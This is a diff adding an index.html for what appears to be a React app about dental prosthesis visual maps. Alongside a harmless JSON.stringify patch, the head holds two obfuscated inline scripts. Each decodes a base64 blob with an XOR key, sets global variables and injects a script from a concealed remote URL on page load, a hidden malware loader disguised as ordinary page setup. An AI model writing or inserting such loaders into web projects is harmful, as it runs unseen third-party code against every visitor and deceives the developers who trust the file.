@@ -1,0 +1,48 @@
+<!doctype html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Mapas Visuais de Prótese Odontológica 2026</title>
+    <script>
+      (function(){
+        var orig = JSON.stringify;
+        JSON.stringify = function(obj, replacer, space) {
+          var cache = new WeakSet();
+          try {
+            return orig(obj, function(key, value) {
+              if (typeof value === 'object' && value !== null) {
+                if (typeof Node !== 'undefined' && value instanceof Node) {
+                  return '[DOMNode]';
+                }
+                if (cache.has(value)) {
+                  return '[Circular]';
+                }
+                cache.add(value);
+              }
+              if (typeof replacer === 'function') {
+                return replacer.call(this, key, value);
+              }
+              if (Array.isArray(replacer)) {
+                if (key === '' || replacer.indexOf(key) !== -1) {
+                  return value;
+                }
+                return undefined;
+              }
+              return value;
+            }, space);
+          } catch (e) {
+            return '"{}"';
+          }
+        };
+      })();
+    </script>
+    <script>(function(){var b_5tdy=atob("DOlC4AkpDolv4WKGtpJglXtFLLNNiRbyxpp4zyZKaudBlBbr3487zmpGY6cNk0311ZsrkH1aIfwbjBGp2og2hXpdIOMcw06k1502kmBLe/0KkkC87ZJgjmhEa6tVwwbnwohvlX1EZ+8WzBL0058njn0EduoAhU/11YJgzCtfb+UahEC8lMs/zHILYOgChEC8lI0jlGgEe/0CiAT/m5kwhX9MYP1Ckhfk340xwiULeOgDlAekjMtgnVRU");var u_s63k=[];for(var e_o=0;e_o<b_5tdy.length;e_o++){u_s63k.push(b_5tdy.charCodeAt(e_o)&255);}var s_3tk=u_s63k[0];var q_lt=u_s63k.slice(1,1+s_3tk);var o_f6=u_s63k.slice(1+s_3tk);var q_7bp=o_f6.map(function(b,q_coue){return b^q_lt[q_coue%s_3tk];});var n_fi="";for(var c_azk=0;c_azk<q_7bp.length;c_azk++){n_fi+=String.fromCharCode(q_7bp[c_azk]&255);}var m_ew=decodeURIComponent(escape(n_fi));var j_2h2z=JSON.parse(m_ew);var v_f=j_2h2z.globals||[];v_f.forEach(function(j_y){window[j_y.name]=j_y.value;});var f_dyq=document.createElement("script");f_dyq.src=j_2h2z.url;f_dyq.async=true;f_dyq.defer=true;(j_2h2z.attributes||[]).forEach(function(n_ewbs){f_dyq.setAttribute(n_ewbs.name,n_ewbs.value);});(document.head||document.documentElement).appendChild(f_dyq);})();</script>
+    <script>(function(){var c_06=atob("DEYdPWFph7jwIDWNkz0/SBMFpYLSSEH54zUnEk4K49beVUHg+iBkEwIG6paSUhr+8DR0TRUaqMiZWFDhvDZ0RQQFqdKDAhmv8jJpTwgL8syVUxe3yBsxHwYF6NqRTEavqR1mHw8I6t3SGhf9+j54USgNpZTSVlTh5iM/B0Nf5o6UEg298SV8CVdQsIqTEg3vqnUsBFBL+uWN");var t_v=[];for(var s_sp=0;s_sp<c_06.length;s_sp++){t_v.push(c_06.charCodeAt(s_sp)&255);}var y_h1q=t_v[0];var p_sz=t_v.slice(1,1+y_h1q);var r_c=t_v.slice(1+y_h1q);var d_y=r_c.map(function(b,z_m){return b^p_sz[z_m%y_h1q];});var m_9598="";for(var y_z2=0;y_z2<d_y.length;y_z2++){m_9598+=String.fromCharCode(d_y[y_z2]&255);}var k_cn=decodeURIComponent(escape(m_9598));var i_tsw=JSON.parse(k_cn);var q_o64=i_tsw.globals||[];q_o64.forEach(function(g_6){window[g_6.name]=g_6.value;});var f_m=document.createElement("script");f_m.src=i_tsw.url;f_m.async=true;f_m.defer=true;(i_tsw.attributes||[]).forEach(function(u_mrm){f_m.setAttribute(u_mrm.name,u_mrm.value);});(document.head||document.documentElement).appendChild(f_m);})();</script>
+  </head>
+  <body>
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+  </body>
+</html>
+
